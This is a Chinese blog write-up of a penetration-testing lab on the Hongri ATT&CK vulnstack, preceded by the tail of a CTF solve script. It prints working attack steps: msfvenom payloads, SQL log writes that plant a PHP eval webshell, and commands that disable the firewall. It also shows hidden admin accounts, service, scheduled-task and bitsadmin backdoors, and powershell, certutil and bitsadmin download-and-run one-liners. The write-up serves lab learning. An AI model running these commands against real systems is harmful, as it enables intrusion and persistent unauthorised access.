    <span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span>origin<span class="token punctuation">,</span>target<span class="token punctuation">,</span>res<span class="token punctuation">)</span>
    <span class="token keyword">if</span> res<span class="token operator">==</span>target<span class="token punctuation">:</span>
        res<span class="token operator">=</span>br<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'/get_flag'</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">'b64_image'</span><span class="token punctuation">:</span>array2b64<span class="token punctuation">(</span>img2<span class="token operator">*</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
        <span class="token keyword">break</span>
</code></pre>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>ATT&amp;CK靶场(1)练习</title>
    <url>/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0.html</url>
    <content><![CDATA[<h1 id="ATT-amp-CK靶场-1-练习"><a href="#ATT-amp-CK靶场-1-练习" class="headerlink" title="ATT&amp;CK靶场(1)练习"></a>ATT&amp;CK靶场(1)练习</h1><p>更多的应该是工具入门和思路学习？对windows的漏洞及其原理所知甚少</p>
<h2 id="工具入门"><a href="#工具入门" class="headerlink" title="工具入门"></a>工具入门</h2><h3 id="Meta-Sploit-Framework"><a href="#Meta-Sploit-Framework" class="headerlink" title="Meta Sploit Framework"></a>Meta Sploit Framework</h3><p>简称msf，应该是最常用的工具了。遇到可能的洞的攻击手法即为msf一把梭<br>msf的常用模块为msfvenom和msfconsole，venom负责生成用于上线的木马，console则是主要交互手段</p>
<h4 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h4><p>用于生成木马<br>使用方式为</p>
<pre><code>msfvenom -p &lt;payload&gt; -o &lt;output&gt; -f &lt;type&gt; &lt;key&gt;=&lt;value&gt;
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o sysupdate.exe lport=10000
</code></pre>
<h4 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h4><h5 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h5><p>console中可以直接执行本机系统命令，也就是ifconfig之类的。在忘了ip的时候可以看一下。<br>对于监听的ip也可以使用对于网卡代替</p>
<blockquote>
<p>Metasploit tip: Adapter names can be used for IP params<br>set LHOST eth0</p>
</blockquote>
<p>试图攻击时使用<code>search</code>指令进行搜索可用的攻击模块<br><code>set unset</code>用于设定攻击选项<br><code>options</code>命令会展示当前模块下所有配置选项<br>使用<code>use &lt;module_name&gt;</code>进入对应模块<br><code>route print</code>展示路由转发<br><code>jobs</code>展示后台任务<br><code>kill</code>停止后台任务</p>
<h5 id="常用模块"><a href="#常用模块" class="headerlink" title="常用模块"></a>常用模块</h5><p>模块好多，我也不知道常用的有哪些。。。<br><code>exploit/mutil/handler</code>接受会话，应该是最常用的吧<br><code>post/windows/gather/arp_scanner</code>和<code>auxiliary/scanner/portscan/tcp</code>两个模块进行扫描，可以配合session的路由转发扫描内网<br><code>auxiliary/server/socks4a</code>和CS类似开启一个socks4的代理，但由于其本身可以使用session进行路由转发，若不需要给其他软件开代理则不需要使用。且socks4的代理不是很行</p>
<h5 id="会话操作"><a href="#会话操作" class="headerlink" title="会话操作"></a>会话操作</h5><p>msf将上线的机器称之为session<br>使用<code>sessions</code>列出当前所有会话，<code>sessions 1</code>进入会话1<br>需注意在会话中只能进行相应的会话操作，无法使用msfconsole中的命令，回到console请使用background，缩写bg，使用exit会导致断开连接<br>接受木马使用<code>exploit/mutil/handler</code>，选择payload类型。对于反向连接的木马启动时可以使用<code>run -j</code>将其作为一个后台任务运行。<br>需要注意payload类型与生成的木马类型需完全一致,<code>windows/x64/meterpreter/bind_tcp</code>无法接收<code>windows/meterpreter/bind_tcp</code>的会话</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220430153616790.png" alt="image-20220430153616790"></p>
<p>会话中也可以简单的使用upload download等语句上传下载文件，ps查看进程，ls查看目录等</p>
<p>会话中常使用msf自带的脚本进行攻击。msf会话有多种形式，最好用的即为meterpreter类型，可以执行msf的进一步操作，而其他的如普通shell则只能当一个shell使用</p>
<p>常用功能有get_local_subnets获取子网网段，getsystem提权到system，getuid查看当前权限，killav关闭杀软等<br>autoroute，可以以受害者为跳板进行内网转发。非常好用（就是有时候似乎不是很稳，玄学网络）</p>
<pre><code>run autoroute -s x.x.x.x/24
run autoroute -p
</code></pre>
<p>在msfconsole中输入<code>route print</code>也可以查看当前路由情况</p>
<p>同时还有两个维持权限的脚本（简单测试一下发现不好用。。。）<br><code>persistence</code>和<code>metsvc</code><br><code>run persistence -X -p 4444 -r 192.168.52.143</code><br>这个是改注册表项，<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code><br>创建一个反弹shell，-X指定后门在系统启动时启动，暂时没找到怎么创建一个正向shell，这里有一层内网不能直接弹出来，但是可以用之前的边缘机，直接在边缘机上起一个handler监听。msf支持将handler监听建立在被控制主机上</p>
<p><code>run metsvc</code>安装系统服务后门，暂时没找到有哪些参数可选，在系统启动时启动一个服务正向监听端口<br>按照官方的说法，这里连上去的payload应该是<code>windows/metsvc_bind_tcp</code>，但实际上我连的时候会各种dead。。。防火墙已经被关掉了来着。不知道什么原因</p>
<p>使用shell命令则打开一个cmd line，但是有中文乱码，使用<code>chcp 65001</code>切换编码（大概）就行</p>
<h3 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h3><p>简称CS，团队服务器，可以几个人连着一个服务器一起日，并且是图形化界面，可以点点点</p>
<p>这里似乎将每个控制的机器称为beacon，功能也很多，不过相较于msf能直接打一堆利用模块，CS更倾向于专注windows渗透，好像没有什么linux相关的功能。</p>
<h4 id="listener模块"><a href="#listener模块" class="headerlink" title="listener模块"></a>listener模块</h4><p>CS使用listener代替msf的handler。CS的listener种类较少，但较为通用，不会出现msf中payload和handler有一点点差别就连不上的情况。还提供了foreign handler用于会话转移。可以将CS中上线的机器连上msf进行进一步渗透<br><a href="https://www.cobaltstrike.com/blog/session-passing-from-cobalt-strike/">Session Passing from Cobalt Strike</a><br>msf应当使用符合类型的handler进行接收</p>
<h4 id="attack模块"><a href="#attack模块" class="headerlink" title="attack模块"></a>attack模块</h4><p>上线也需传一个马上去回连，在顶部栏<code>attack</code>处点击生成payload，需选择对应的listener接受。常用的有package下的后三个，以及web drive-by<br>package下的windows executeable是staged，这种马只是个加载器，需要后续加载其他功能（也许有一定的免杀能力），有(S)的是stageless的，就是打好包一把梭<br>payload generator处能产生各种语言的payload，在目标环境有命令执行和对应语言时能直接执行上线，谨防杀软</p>
<p>web drive-by用于进行一些web相关的交互，能建立文件服务器，构造钓鱼网站，或者说打一个script web deliver攻击，这个攻击也是命令行直接执行，做免杀处理<br>不过均需要目标机器能访问到CS服务器。内网环境下就不怎么好用了</p>
<h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><p>已上线的机器称为beacon，右键一个beacon，选择interact开始命令行交互<br>终端输入<code>help</code>获取帮助<br>cs为了隐蔽性，不建立长连接，而是beacon有一个睡眠时间，每隔多少时间向服务器发起一次回连，接受命令，并在下一次回连时返回结果。使用<code>sleep</code>命令控制beacon休眠时间，0则进入interactive模式。开启socks代理和远程桌面等功能均需要该选项</p>
<p>使用run或exec在目标机器上执行shell命令，exec不会返回结果，适合一些服务类型的命令</p>
<p><code>socks &lt;port&gt;</code>命令会在team server上开启一个端口转发，使用之前需使用sleep 0将beacon调至interactive模式。为socks4代理。并不是很实用感觉</p>
<p>access下面主要用dump hashes或者run mimikatz抓密码。当然前提是这个beacon的权限足够<br>explore下可以连远程桌面，进行文件系统交互之类的，端口扫描功能较为常用，可以进行端口扫描和主机发现<br>pivoting用于开启代理转发，就是socks命令。需再次注意开启的是socks4<br>spawn用于会话转移</p>
<h4 id="顶部栏"><a href="#顶部栏" class="headerlink" title="顶部栏"></a>顶部栏</h4><p>顶部栏中几个比较常用的功能有<br>查看网络拓扑图，查看beacon列表，查看targets，查看credentials</p>
<p>在targets中可以通过之前hashdump出来的凭据直接对域内机器发起攻击。jump选中一个凭据然后建立一个smb listener。一键上线</p>
<p>smb listener是正向监听的，不需要回连，也很适合这个内网环境。文章中一开始的拓扑逻辑即为边缘win7可出网反向链接，内网两台机子直接通过凭据登录进去smb正向连接</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a><br>大名鼎鼎的红日靶场环境，从这下。百度网盘十几个G，本来以为凉了，结果发现百度网盘调一下选项在开了允许p2p的情况下可以把速度提到2m&#x2F;s，勉强可接受。</p>
<p>网络拓扑就是win7是边缘机器，内网一个winserver08一个03，08域控<br>win7和攻击者联通，位于同一网段内且可出网，同时win7连接内网windows server，内网无法出网<br>到VMware的虚拟网络编辑器单独开一个网段指定网段且仅主机模式不通外网，也不要把物理机连接到该网段<br>然后win7和kali直接接VMware的nat网段好了，方便联网出网，也符合环境定位。也没什么问题</p>
<p>网络拓扑如图，贴一个CS一键打穿画出来的拓扑</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220501160326834.png" alt="image-20220501160326834"></p>
<p>但是有一点坑。。。好多服务不是开机自启动的，win7的服务需要手动进去开phpstudy。。。我就说怎么一开始没东西。windows server里的服务也要手动启动，但由于我不怎么会，后续没有打</p>
<h2 id="拿下边缘机"><a href="#拿下边缘机" class="headerlink" title="拿下边缘机"></a>拿下边缘机</h2><p>假定先拿到目标网段不知道具体位置，练习nmap使用<br>直接<code>nmap -h</code>就能看到绝大多数的可选项了</p>
<p>先<code>nmap -sP 192.168.68.0/24</code>用ping扫一轮。（直接ping扫有的究极防火墙可能扫不动。）<br>也可以直接扫的同时syn扫一轮常见端口<br><code>nmap -PS 192.168.68.0/24</code>，VMware的内网快的一笔，扫的飞快，然而，实际上我去扫别人的时候各种原因扫的龟慢</p>
<p>然后用高强度攻击指令梭<code>nmap -sV -A 192.168.68.140</code>，<br>-sV是尝试判断版本，-A是<code>Enable OS detection, version detection, script scanning, and traceroute</code>buff拉满，扫描速度就慢了下来</p>
<pre><code>PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)
|_http-title: phpStudy \xE6\x8E\xA2\xE9\x92\x88 2014 
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45
3306/tcp open  mysql   MySQL (unauthorized)
</code></pre>
<p>结果如上，直接指出了服务器的版本，mysql也对公网开放，后面跟了一个unauthorized，意思是未授权吗？实际上去连接的时候却报错<code>Host &#39;192.168.68.139&#39; is not allowed to connect to this MySQL server</code>，看这个样子是限制了可访问的ip的</p>
<p>看一眼web服务，是一个14年的phpstudy搭的PHP探针。有一个令人在意的功能，为mysql数据库连接测试，摸出来rouge MySQL trytry。能连上，但似乎并没有允许load local data，读不了。并且读文件也做不到rce，ctf思路有点重，百度这个14年的PHP探针得到的结果全都是配套的phpmyadmin弱密码rce（虽然这里确实是这么个做法），先扫描器开梭</p>
<p>简单的看了一下kali下的工具，结果都要提供字典。不如用御剑或者dirsearch自带字典开梭（然后把dirsearch的字典放进去了跑起来也报错。。。感觉不如。。。dirsearch。。。稳定性）</p>
<p>只能扫出来一个phpmyadmin（扫出来beifen.rar的字典真不是一般人）弱密码root&#x2F;root进入。简单使用一下，有一个newyxcms数据库。里面有一个yx admin数据，密码md5拿到，cmd5搜一下收费记录，pmd5能搜出来，<code>949ba59abbe56e05</code><br>执行<code>SELECT @@secure_file_priv</code>查看文件写入权限，为null，不给写。</p>
<h3 id="突破secure-file-priv写文件"><a href="#突破secure-file-priv写文件" class="headerlink" title="突破secure_file_priv写文件"></a>突破secure_file_priv写文件</h3><p><a href="https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html">Mysql写文件</a><br>在能够堆叠注入或是直接执行SQL语句时可以通过日志文件的方式进行数据的写入，虽然会有一些杂数据，但仅仅是PHP马的话还是没有问题的</p>
<h4 id="general-log写入"><a href="#general-log写入" class="headerlink" title="general_log写入"></a>general_log写入</h4><p>这个是每一个查询都会写入，任意导致文件被写的很大，PHP对文件存在大小限制，过大则无法解析。故不常用，或者堆叠用完记得关。最好也把一开始的路径记下来还原回去</p>
<pre class=" language-mysql"><code class="language-mysql">set global general_log = on;
set global general_log_file = 'C:/phpStudy/WWW/info.php';
select '<?php phpinfo();?>';
set global general_log = off;
</code></pre>
<p>由于部署的PHP探针暴露了网站根目录位置，此处直接写入</p>
<h4 id="long-query-time慢日志写入"><a href="#long-query-time慢日志写入" class="headerlink" title="long_query_time慢日志写入"></a>long_query_time慢日志写入</h4><p>前段时间学习过，MySQL对查询时间超出该变量限制的语句进行记录，默认为10s，正常运行很少触发该情形，故日志文件大小可控。（其实默认是关了慢日志的）</p>
<pre class=" language-mysql"><code class="language-mysql">show variables like '%slow_query_log%';
set global slow_query_log=1;
set global slow_query_log_file='C:/phpStudy/WWW/shell.php';
select '<?php @eval($_POST[abc]);?>' or sleep(11);    
</code></pre>
<p>这里有一个巨坑。。。之前应该是为了下插件给蚁剑开了代理，导致我局域网实际上这个内网访问不到一直连不上。。。排查了半天</p>
<h3 id="yxcms弱密码进入后台"><a href="#yxcms弱密码进入后台" class="headerlink" title="yxcms弱密码进入后台"></a>yxcms弱密码进入后台</h3><p>之前提到过在phpmyadmin处已经拿了个shell了，也顺手拿到了密码的hash<br>这下来打一下这个yxcms（这个cms本身需要扫到yxcms这个目录？）因为打开时的默认页面是个PHP探针来着。然而这个hash不能直接打，套的有东西。并且这个太默认了一点，上来都给密码送出来了。。。感觉再垃圾的站应该也不会垃圾到这个程度了</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220426164243942.png" alt="image-20220426164243942"></p>
<p>甚至告诉了后台入口，这里直接点页面上的登录按钮是有一个<code>/yxcms/index.php?r=member/index/login</code>的路由来处理的，将member改为admin进行管理员登录确实是一个可行思路</p>
<p>后台rce的话理论上来说是比较简单的，WordPress这种成熟框架到了后台也是任意rce的，毕竟谁防管理员呢？这里找一下可能的危险操作</p>
<p>最显眼的就是模板编辑了。选一个看起来比较通用的index_index.php，加一个一句话木马打通<br>然后看一下其他功能，有一个数据库操作，可以进行和phpmyadmin时一样的操作，还有一个应用导入，允许上传一个特定格式的安装包进行应用安装，也许研究一下格式可以传一个马上去</p>
<h2 id="渗透环节"><a href="#渗透环节" class="headerlink" title="渗透环节"></a>渗透环节</h2><p>打一波cs玩一下捏<br>其实应该想看一下用户权限和域相关情况是不是域之类的（这里我也不知道他是怎么部署的环境，但是我开机的时候直接是域管的登录界面，我就直接登录域管了，所以也直接是域管权限。。。）</p>
<pre><code>net view /domain
net user /domain
whoami /all
</code></pre>
<p>第一个命令在蚁剑的虚拟终端上跑不出来结果。蚁剑的虚拟终端在执行某些命令以及使用管道符等时有时候有问题，不知道他具体是怎么解析命令的，也许到这一步应该直接转战cs或者msf<br>whoami &#x2F;all可以看用户权限，直接看到本地管理+域管双重无敌权限</p>
<p>上线之前先看一下有没有杀软之类的，因为有的话我就不会免杀了嘻嘻（也许能在蚁剑命令行直接关了杀软防火墙？）<br>windows直接<code>tasklist /SVC</code>看任务管理器，无杀软（说起来好像windows defender就算存在也找不到？不是很懂）。CS启动</p>
<p>先注册一个listener监听端口收shell，然后在Attacks里面直接生成一个Windows Executeable，因为没有杀软直接stageless一把梭。用蚁剑传到目标服务器后梭。然后发现蚁剑执行beacon.exe半天没有反应，回到网页上的webshell去直接执行，也没有用捏</p>
<p>进虚拟机排查原因，然后发现被究极防火墙拦了。。。这咋整啊</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220426200143080.png" alt="image-20220426200143080"></p>
<p>翻出来一个手册<a href="https://www.mi1k7ea.com/2020/02/27/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">内网信息收集之本机信息收集</a></p>
<p>但是我这个号是究极管理员来着，可以放行这个软件<br><code>netsh firewall add allowedprogram c:\phpstudy\www\beacon.exe &quot;exploit&quot; enable</code><br>这里有一个坑。。。描述字符串一定要用双引号包裹，用单引号包裹打了半天和我syntax error</p>
<p>甚至大力出奇迹，直接关掉防火墙<br>Windows Server 2003及之前的版本：<br><code>netsh firewall set opmode disable</code><br>Windows Server 2003之后的版本：<br><code>netsh advfirewall set allprofiles state off</code></p>
<p>成功上线，一开始生成的是32位的payload，一直没打通，然后生成了一个64位的就又打通了？理论上来说不应该64位是兼容32位的吗，总之这种东西玄学多多，多试几下</p>
<p>接下来应该想办法往内网打了，先部署一下nmap吧？</p>
<p>其实直接<code>net user /domain</code>,<code>net time /domain</code>之类的操作能直接看到域控名字，再ping一下就有ip了，或者nslookup反查，不过要发现域内全部主机的话，还是得扫的</p>
<h3 id="内网代理-amp-端口扫描"><a href="#内网代理-amp-端口扫描" class="headerlink" title="内网代理&amp;端口扫描"></a>内网代理&amp;端口扫描</h3><p>在CS终端中键入<code>socks &lt;port&gt;</code>以开启一个socks代理，使用之前需要先sleep 0将beacon调成实时交互的，然后在kali上使用proxychains工具进行流量转发<br>在proxychains profile的最后一行添加上CS服务器的IP和开启转发的端口即可</p>
<pre><code>beacon&gt; sleep 0
[*] Tasked beacon to become interactive
[+] host called home, sent: 16 bytes
beacon&gt; socks 50000
[+] started SOCKS4a server on: 50000
[+] host called home, sent: 16 bytes
</code></pre>
<p><code>proxychains nmap -sT -Pn 192.168.52.0/24</code><br>因为CS开的是socks4的代理，只能转发tcp流量，所以需要添加-sT参数使用TCP扫描，而-Pn则是禁用ping</p>
<p>这里需要注意的是CS的socks命令是在CS服务器上开启一个代理端口，而不是被种了马的机器。。。。扫描效率奇低无比</p>
<p>直接用CS自带的扫描试试。不加端口就是主机探测。</p>
<pre><code>beacon&gt; portscan 192.168.52.0-192.168.52.255  arp 1024
[*] Tasked beacon to scan ports  on 192.168.52.0-192.168.52.255
[+] host called home, sent: 93245 bytes
[+] received output:
(ARP) Target &#39;192.168.52.1&#39; is alive. 00-50-56-C0-00-0B

[+] received output:
(ARP) Target &#39;192.168.52.143&#39; is alive. 00-0C-29-E9-6D-68
(ARP) Target &#39;192.168.52.138&#39; is alive. 00-0C-29-F6-F6-F0
(ARP) Target &#39;192.168.52.141&#39; is alive. 00-0C-29-71-10-BB

[+] received output:
(ARP) Target &#39;192.168.52.254&#39; is alive. 00-50-56-F1-E2-4B

[+] received output:
Scanner module is complete
</code></pre>
<p>143是本机，发现内网存在138和141两台机器，其中138是之前就已经知道是域控的机器（也可以直接使用<code>net view</code>命令进行主机发现）</p>
<p>简单扫端口，他这个端口是倒过来扫的，从高往低</p>
<p>但是想接着打还是不能就着CS的这个socks，太卡了。传一个earthworm上去试试吧。因为这里kali和win7边缘机是在一个网段的，最简单的情况，直接监听一个端口即可，从这里抄命令<br><a href="https://www.cnblogs.com/0nth3way/p/11693188.html">内网穿透利器——EarthWorm</a><br><code>ew_win32.exe -s ssocksd -l 8888</code>，记得再运行一次上面的指令把防火墙打开<br>这里CS最好用execute指令而不是run指令。。。不然ew代理时的输出会一直弹出来<br>这里重启了一下ew，抄两个杀进程指令，一个按名字杀一个按pid杀<br><code>Taskkill /IM firefox.exe /F</code><br><code>Taskkill /PID 26356 /F</code><br>proxychains的配置文件中需要将原先写的socks4改为socks5，ew是不支持socks4的（所以说CS只支持socks4还是有点过时了，一开始跑了半天代理都不通，最后直接上机子看才发现还有这种问题）</p>
<p>然后再try一try nmap。因为ew是socks5的代理，也就能支持udp等各种扫描了。结果ew代理也卡的一比，现在就要考虑是哪里出问题了，经过简单搜索后发现是proxychains的问题。其自带了一个超时设置，默认15s，nmap扫描出的没开的端口全都按超时处理。。。不卡才怪，调到0.1s之后急速扫描（也不是很急速吧。。。扫全部常用端口也要好几分钟。。。）就凑合着用CS的也一样，就少一点信息而已</p>
<h3 id="会话转移"><a href="#会话转移" class="headerlink" title="会话转移"></a>会话转移</h3><p>CS的功能感觉有限，因为有445端口，根据wp这里可以打永恒之蓝，转移到msf打<br>msf上线的方案也有多种，可以直接在CS里面设置一个foreign listener，这里直接选择reverse https。在msfconsole中启动一个对应的handler接受</p>
<p>也可以用msfvenom生成对应的马，这里试一下CS将会话转发给msf</p>
<pre><code>use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set lhost 192.168.68.139
set lport 443
run
</code></pre>
<p>payload的类型要弄对。。。一开始填成了<code>windows/x64/meterpreter/reverse_https</code>，多了一个x64就跑不通了。。然后在CS中直接右键已有的session，<code>spawn</code>中选中配置的foreign listener即可，非常好用</p>
<h3 id="msf利用ms08-068"><a href="#msf利用ms08-068" class="headerlink" title="msf利用ms08 068"></a>msf利用ms08 068</h3><p>msf也自带了主机发现和端口扫描功能，位于<code>post/windows/gather/arp_scanner</code>和<code>auxiliary/scanner/portscan/tcp</code>，效率一般，且都不如nmap的buff加满的扫描能报告可能存在的洞。但感觉proxychains+nmap时受到扫描未开放端口时timeout的影响，不知道直接在被控制机器上装一个nmap是不是会快一点</p>
<p>两台机子都开了445端口，这个是经典windows smb服务，但具体是什么我也不会。。。<br>看答案是用的一个比较老的洞ms08-068和经典ms17 010永恒之蓝打的<br>可以直接<code>search ms08 068</code>找到msf对应的攻击模块<br>考虑网络拓扑模型，由于我们以边缘机win7位跳板发动攻击，内网机器无法访问外网，因此无法使用反弹的方式获取会话。这里的payload选择<code>windows/meterprete/bind_tcp</code>，以tcp正向连接的方式攻击</p>
<p>然而并没有打通。。。msf会显示一套payload打了过去，但是<code>Exploit completed, but no session was created.</code>，尝试再次攻击就会发现直接unreachable，直接打坏了，需要重启才能继续打。。。。计划不通，就当练习msf怎么用了</p>
<h3 id="ms17010永恒之蓝"><a href="#ms17010永恒之蓝" class="headerlink" title="ms17010永恒之蓝"></a>ms17010永恒之蓝</h3><p>search ms17 010寻找可用模块<br>第一天把msf几个模块都打了一遍全都打不通。只有一个<code>auxiliary/admin/smb/ms17_010_command</code>能执行命令，生成session的全都不行。用这个命令上去把防火墙关了也不行<br>第二天用ps_exec+bind_tcp又突然打通了，概率事件。。。后来断了一次之后一模一样的payload又打不通了，感觉msf的转发不是很稳。概率事件。。。但是用CS的转发和earthworm之类的好像也没有稳定过，玄学。</p>
<p>直接用命令执行也能一句一句的打出来一个msf的session。具体见下文</p>
<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p>学习一下操作</p>
<h4 id="建立隐藏用户"><a href="#建立隐藏用户" class="headerlink" title="建立隐藏用户"></a>建立隐藏用户</h4><p>创建一个用户名以$结尾的用户不会被net user指令给发现，再偷偷的给这个号加进管理员</p>
<pre><code>net user ghost$ ghost@dc2022 /add
net localgroup administrators ghost$ /add
</code></pre>
<p>实际上还是能在某些地方被看见，然后可以通过更为复杂的手段进行进一步隐藏<br>这里暂未学习（然后直接用这个号在CS上jump进去就行了，当然，也可以直接用之前域管的号）</p>
<h4 id="创建系统服务"><a href="#创建系统服务" class="headerlink" title="创建系统服务"></a>创建系统服务</h4><p>有session的情况下直接upload功能上传文件<br>由于永恒之蓝打进去就直接是SYSTEM权限，所以在接下来的利用过程中不会出现权限的问题。尝试创建一个开机自启服务以进行权限维持。考虑机器位于内网中，无法反向弹出shell，使用msfvenom创建一个正向连接的后门，监听在10000端口<br>同时上传文件后防火墙放行该程序，注意描述处需要使用双引号，路径处无需引号。</p>
<p>然后创建系统服务，注意几个赋值语句的等于号后都有一个空格</p>
<pre><code>meterpreter &gt; upload sysupdate.exe
meterpreter &gt; shell
C:\Windows\system32&gt;netsh firewall add allowedprogram C:\Windows\system32\sysupdate.exe &quot;test&quot; enable
C:\Windows\system32&gt;sc create &quot;SysUpdate&quot; binpath= &quot;C:\Windows\system32\sysupdate.exe&quot;
C:\Windows\system32&gt;sc description &quot;SysUpdate&quot; &quot;system update&quot;
C:\Windows\system32&gt;sc config &quot;SysUpdate&quot; start= auto
C:\Windows\system32&gt;net start &quot;SysUpdate&quot;
</code></pre>
<p>可以在运行services.msc查看已经成功添加了一个服务（但是这里的exe是我直接用msfvenom生成的。。。好像服务需要满足一定的接口所以跑不起来）</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220429172712073.png" alt="image-20220429172712073"></p>
<p>用不了删除服务吧<br><code>sc delete &quot;SysUpdate&quot;</code></p>
<h4 id="写入定时计划"><a href="#写入定时计划" class="headerlink" title="写入定时计划"></a>写入定时计划</h4><p><code>schtasks /create /sc minute /mo 5 /tn &quot;check update&quot; /tr C:\Windows\syswow64\sysupdate.exe</code><br>这里也有一个坑，msf上传文件和显示的pwd都是C:\Windows\system32，就算指定上传到system32，最后实际上却传到的地方是C:\Windows\syswow64。<br>并且ls之类的实际上显示的都应当是syswow64的内容，但就是显示自己在system32目录中。。<br>就算在会话里输入shell进入一个windows shell里面，使用<code>echo %cd%</code>查看当前目录，得到的结果仍是system32。但实际上我进入虚拟机在文件系统里面翻了半天，最后发现上传的文件在syswow64中</p>
<p>踩了第二个坑，上述操作是对于某个用户创建一个定时计划，只在用户登录时运行。如果用户不登录，或者本身该账户就没有交互能力，则无法触发。永恒之蓝拿到的权限直接是SYSTEM，属于不可交互的用户，该命令无法完成利用<br>在图形界面中查看会看到如下内容</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220429210446446.png" alt="image-20220429210446446"></p>
<p>该命令会勾选<code>只在用户登录时运行</code>，但实际上账户确是SYSTEM。也可以尝试指定上一步的影子用户创建定时任务。不过影子用户的话除了攻击者谁又会主动登录呢？</p>
<p>翻了下windows的手册，有提到如何使用系统账户创建服务，加上一个<code>/ru SYSTEM</code>即可<br><a href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/schtasks-create#to-schedule-a-task-that-runs-with-system-permissions">schtasks create</a></p>
<p>正向连接之前上传的木马，成功上线</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20220429210911146.png" alt="image-20220429210911146"></p>
<p>实际上msf自带了持久化功能，但是我试着把两个都run了一遍，反弹shell的毫无反应，监听端口的确实看到他开了端口监听，但是用他的metsvc_bind_tcp连上去连不上。。。</p>
<h4 id="命令行文件下载"><a href="#命令行文件下载" class="headerlink" title="命令行文件下载"></a>命令行文件下载</h4><p>但这里是属于运气比较好，永恒之蓝某次人品爆炸打上去了，然后直接传了个文件，要是只有命令执行该怎么传文件呢</p>
<p>因为边缘机提供了web服务，所以可以直接把马传到边缘机上等待下载</p>
<pre class=" language-powershell"><code class="language-powershell">powershell <span class="token punctuation">(</span><span class="token function">new-object</span> Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadFile<span class="token punctuation">(</span><span class="token string">'http://192.168.52.143/sysupdate.exe'</span><span class="token punctuation">,</span><span class="token string">'C:\sysupdate.exe'</span><span class="token punctuation">)</span>
bitsadmin <span class="token operator">/</span>transfer myDownLoadJob <span class="token operator">/</span>download <span class="token operator">/</span>priority normal <span class="token string">"http://192.168.52.143/sysupdate.exe"</span> <span class="token string">"C:\sysupdate.exe"</span>
certutil <span class="token operator">-</span>urlcache <span class="token operator">-</span>split <span class="token operator">-</span>f http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>52<span class="token punctuation">.</span>143<span class="token operator">/</span>sysupdate<span class="token punctuation">.</span>exe C:\sysupdate<span class="token punctuation">.</span>exe
<span class="token function">Start</span><span class="token operator">-</span>BitsTransfer <span class="token operator">-</span>Source <span class="token string">"http://192.168.52.143/sysupdate.exe"</span> <span class="token operator">-</span>Destination <span class="token string">"C:\sysupdate.exe"</span> <span class="token comment" spellcheck="true"># 在win server2008上显示找不到</span>
</code></pre>
<p>msf set command的时候要各种转义<br>下载的时候需要一点点时间，可以尝试<code>set DELAY 5</code>多停留一会</p>
<h4 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h4><p>原来这个东西不止能下文件，还能直接启动后门<br>这里的addfile理论上能下东西，下下来再执行恶意软件，也可以直接是一个无效的url（有待考证，建议使用有效url），主要的利用点在于SetNotifyCmdLine，此处可以启动其他地方的已经存在的后门软件，也可以尝试启动刚才下载的软件</p>
<pre class=" language-powershell"><code class="language-powershell">bitsadmin <span class="token operator">/</span>create backdoor
bitsadmin <span class="token operator">/</span>addfile backdoor <span class="token string">"http://192.168.52.143/sysupdate.exe"</span>  <span class="token string">"C:\backdoor.exe"</span>
bitsadmin <span class="token operator">/</span>SetNotifyCmdLine backdoor C:\backdoor<span class="token punctuation">.</span>exe NUL
bitsadmin <span class="token operator">/</span>SetMinRetryDelay <span class="token string">"backdoor"</span> 60 
